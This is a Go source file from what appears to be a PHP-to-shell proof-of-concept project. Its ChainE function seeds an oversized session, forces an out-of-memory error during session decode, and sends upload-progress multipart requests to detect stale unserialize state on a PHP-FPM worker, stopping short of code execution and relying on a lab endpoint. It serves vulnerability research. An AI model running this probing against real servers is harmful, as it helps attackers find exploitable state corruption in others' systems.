package verify

import (
	"context"
	"fmt"
	"net/url"
	"strconv"
	"strings"

	"github.com/eltonlaice/php2shell-poc/internal/mp"
)

// ChainE verifies the FPM stale-global-state path.
//
// Experimental. It needs the lab-only /seed_session.php endpoint to create a
// large session file, then it triggers an OOM during session decode and looks
// for stale-state evidence on the next request. The consumer must land on the
// same worker, so the run is repeated a few times.
func ChainE(ctx context.Context, opt Options) (Result, error) {
	res := Result{Chain: "E", Summary: "not confirmed"}
	if err := checkTarget(opt); err != nil {
		return res, err
	}
	if opt.Size <= 0 {
		opt.Size = 24 << 20
	}
	cl := opt.client()

	producerSID := newSID()
	seed, err := urlFor(opt.Target, "/seed_session.php")
	if err != nil {
		return res, err
	}
	u, err := url.Parse(seed)
	if err != nil {
		return res, err
	}
	q := u.Query()
	q.Set("sid", producerSID)
	q.Set("size", strconv.FormatInt(opt.Size, 10))
	u.RawQuery = q.Encode()

	seedResp, err := cl.Get(u.String(), nil)
	if err != nil {
		return res, fmt.Errorf("chain E: seed session: %w", err)
	}
	if seedResp.Status == 404 {
		res.Summary = "lab seeder endpoint not found"
		res.Notes = append(res.Notes,
			"chain E needs /seed_session.php from the bundled lab (it is not an attack primitive)",
		)
		return res, nil
	}
	res.Evidence = append(res.Evidence, fmt.Sprintf("seeded %d MiB session -> %d", opt.Size>>20, seedResp.Status))

	oomSeen := false
	staleSeen := false
	for i := 0; i < opt.attempts(); i++ {
		select {
		case <-ctx.Done():
			return res, ctx.Err()
		default:
		}

		producer, err := urlFor(opt.Target, "/session_oom.php")
		if err != nil {
			return res, err
		}
		prodResp, err := cl.Get(producer, map[string]string{"Cookie": "PHPSESSID=" + producerSID})
		if err != nil {
			res.Notes = append(res.Notes, "producer request failed: "+err.Error())
			continue
		}
		if strings.Contains(string(prodResp.Body), "Allowed memory size") {
			oomSeen = true
		}

		// The consumer needs a non-empty session so that rfc1867 has data to
		// decode with the stale BG(unserialize) state.
		consumerSID := newSID()
		seedConsumer, err := urlFor(opt.Target, "/seed_session.php")
		if err != nil {
			return res, err
		}
		cu, err := url.Parse(seedConsumer)
		if err != nil {
			return res, err
		}
		cq := cu.Query()
		cq.Set("sid", consumerSID)
		cq.Set("size", "1024")
		cu.RawQuery = cq.Encode()
		_, _ = cl.Get(cu.String(), nil)

		// Consumer: any endpoint works, because rfc1867 starts the session
		// before application code.
		b := mp.New()
		body, err := b.Bytes(
			mp.Part{Name: "PHP_SESSION_UPLOAD_PROGRESS", Value: []byte("p2s")},
			mp.Part{Name: "f", Filename: "a", Value: []byte("Z")},
		)
		if err != nil {
			return res, err
		}
		consumer, err := urlFor(opt.Target, "/nosession.php")
		if err != nil {
			return res, err
		}
		consResp, err := cl.Post(consumer, body, b.ContentType(),
			map[string]string{"Cookie": "PHPSESSID=" + consumerSID})
		if err != nil {
			res.Notes = append(res.Notes, "consumer request failed: "+err.Error())
			continue
		}
		text := string(consResp.Body)
		if strings.Contains(text, "Session object destruction failed") ||
			strings.Contains(text, "Failed to decode session object") {
			staleSeen = true
			res.Evidence = append(res.Evidence, "stale session state observed on attempt "+strconv.Itoa(i+1))
			break
		}
	}

	switch {
	case oomSeen && staleSeen:
		res.OK = true
		res.Summary = "stale session state observed after decode OOM (no code execution attempted)"
	case oomSeen:
		res.Summary = "producer OOM observed, stale consumer state not reproduced"
		res.Notes = append(res.Notes,
			"the consumer request must reach the same FPM worker; pin pm.max_children=1 or retry",
		)
	default:
		res.Summary = "producer OOM not observed"
		res.Notes = append(res.Notes,
			"lower memory_limit or increase the session size",
		)
	}
	return res, nil
}
